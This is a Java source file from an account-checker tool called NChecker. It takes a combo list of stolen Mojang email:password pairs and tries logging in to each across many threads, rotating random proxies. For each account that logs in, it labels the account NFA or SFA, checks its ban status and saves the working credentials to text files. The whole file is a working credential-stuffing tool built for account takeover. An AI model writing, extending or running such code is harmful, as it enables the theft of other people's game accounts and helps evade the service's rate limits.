package dev.tolja.Checkers.Modules;

import dev.tolja.Checkers.Checker;
import dev.tolja.Checkers.OutputManager;
import dev.tolja.Configuration.ConfigManager;
import dev.tolja.Data.MojangAccount;
import dev.tolja.Data.ProxyInfo;
import dev.tolja.Nchecker;
import dev.tolja.Utils.BannedUtils;
import dev.tolja.Utils.BannedUtils.BannedType;
import dev.tolja.Utils.IOUtils;
import dev.tolja.Utils.MojangUtils;
import org.fusesource.jansi.Ansi;
import org.fusesource.jansi.AnsiConsole;
import org.fusesource.jansi.internal.Kernel32;

import java.io.File;
import java.net.Proxy;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class BanChecker extends Checker {
    private final AtomicInteger checked = new AtomicInteger();
    private final AtomicInteger banned = new AtomicInteger();
    private final AtomicInteger unbanned = new AtomicInteger();
    private final AtomicInteger error = new AtomicInteger();
    private final AtomicInteger failed = new AtomicInteger();

    @Override
    public void runChecker() {
        ConfigManager configManager = Nchecker.getConfigManager();
        Object[] resources = IOUtils.loadResources(true, configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT, false);
        if (resources == null) return;
        List<ProxyInfo> proxies = (List<ProxyInfo>) resources[0];
        List<MojangAccount> combos = (List<MojangAccount>) resources[1];
        OutputManager outputManager = new OutputManager(new File(".", "results/Banchecker/"), "2");
        long startTime = System.currentTimeMillis();
//        Kernel32.SetConsoleTitle("NChecker | Starting thread...");
        ExecutorService threadPool = Executors.newFixedThreadPool(configManager.getSettingsConfig().getThreads());

        // 开始
        for (MojangAccount account : combos) {
            threadPool.submit(new Runnable() {
                @Override
                public void run() {
                    int recheckCount = 0;
                    do {
                        if (configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT) {
                            MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout(), configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT ? proxies.get(new Random().nextInt(proxies.size())) : null);
                        } else {
                            MojangUtils.loginAccount(account, configManager.getSettingsConfig().getTimeout());
                        }
                    } while (!account.isCracked() && configManager.getSettingsConfig().getMaxRecheckCount() > recheckCount++);
                    if (account.isCracked()) {
                        recheckCount = 0;
                        account.setSecurity(MojangUtils.isSFA(account, configManager.getSettingsConfig().getTimeout()));
                        AnsiConsole.out().println(Ansi.ansi().fgBrightGreen().a("[" + (account.isSecurity() ? "NFA" : "SFA") + "] " + account.getAccount() + ":" + account.getPassword()).reset());
                        BannedType bt;
                        if (configManager.getSettingsConfig().getProxyType() != Proxy.Type.DIRECT) {
                            ProxyInfo proxy = proxies.get(new Random().nextInt(proxies.size()));
                            bt = BannedUtils.isBanned(account.getPlayerName(),  account.getAccessToken(), account.getUuid(), proxy);
                        } else {
                            bt = BannedUtils.isBanned(account.getPlayerName(),  account.getAccessToken(), account.getUuid(), null);
                        }

                            if (bt == BannedType.ERROR) {
                                AnsiConsole.out().println(Ansi.ansi().fgBrightRed().a("[Error] " + account.getAccount() + ":" + account.getPassword()).reset());
                                outputManager.writeLine("Error.txt", account.getAccount() + ":" + account.getPassword());
                                error.getAndIncrement();
                            } else if (bt == BannedType.OTHERBAN) {
                                AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Banned] " + account.getAccount() + ":" + account.getPassword()).reset());
                                outputManager.writeLine("OtherBanned.txt", account.getAccount() + ":" + account.getPassword());
                                banned.getAndIncrement();
                            } else if (bt == BannedType.IPBAN) {
                                AnsiConsole.out().println(Ansi.ansi().fgBrightCyan().a("[Banned] " + account.getAccount() + ":" + account.getPassword()).reset());
                                outputManager.writeLine("Ipbanned.txt", account.getAccount() + ":" + account.getPassword());
                                banned.getAndIncrement();
                            } else if (bt == BannedType.UNBANNED) {
                                AnsiConsole.out().println(Ansi.ansi().fgBrightYellow().a("[Unbanned] " + account.getAccount() + ":" + account.getPassword()).reset());
                                outputManager.writeLine("Unbanned.txt", account.getAccount() + ":" + account.getPassword());
                                unbanned.getAndIncrement();
                            }

                    } else {
                        if (configManager.getSettingsConfig().isPrintFailed()) {
                            AnsiConsole.out().println(Ansi.ansi().fg(Ansi.Color.RED).a("[Failed] " + account.getAccount() + ":" + account.getPassword()).reset());
                        }
                        if (configManager.getSettingsConfig().isSaveFailed()) {
                            outputManager.writeLine("Failed.txt", account.getAccount() + ":" + account.getPassword());
                            failed.getAndIncrement();
                        }
                    }
                    checked.getAndIncrement();
                }
            });
        }
        threadPool.shutdown();
        SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
        while (!threadPool.isTerminated()) {
            try {
                int time = (int) ((System.currentTimeMillis() - startTime) / 1000);
                Kernel32.SetConsoleTitle("NChecker"
                        + " | Checked: " + checked.get() + "/" + combos.size() + " (" + String.format("%.2f", (double) checked.get() / combos.size() * 100) + "%)"
                        + " | Unbanned: " + unbanned.get() + " - " + "Banned: " + banned.get() + "| Cpm: " + (int) Math.ceil((double) checked.get() / time * 60)
                        + " | Elapsed: " + dateFormat.format(new Date(System.currentTimeMillis() - startTime - (8 * 60 * 60 * 1000))));
                Thread.sleep(1000);
            } catch (Exception ignored) {
            }
        }
        Kernel32.SetConsoleTitle("NChecker | Ver " + Nchecker.VERSION);
        AnsiConsole.out.println(Ansi.ansi().fg(Ansi.Color.CYAN).a(
                "\r\nAll done.\r\n"
                        + "Unbanned: " + unbanned.get() + " - " + "Banned: " + banned.get() + " - " + "Error: " + error.get()
                        + " | Elapsed: " + dateFormat.format(new Date(System.currentTimeMillis() - startTime - (8 * 60 * 60 * 1000)))
        ).reset());
        AnsiConsole.out.println(Ansi.ansi().fgBrightYellow().a("Unbanned: " +unbanned.get() + "\r\n" +
                "Banned: " + banned.get() + "\r\n"
        ).reset());
    }
}
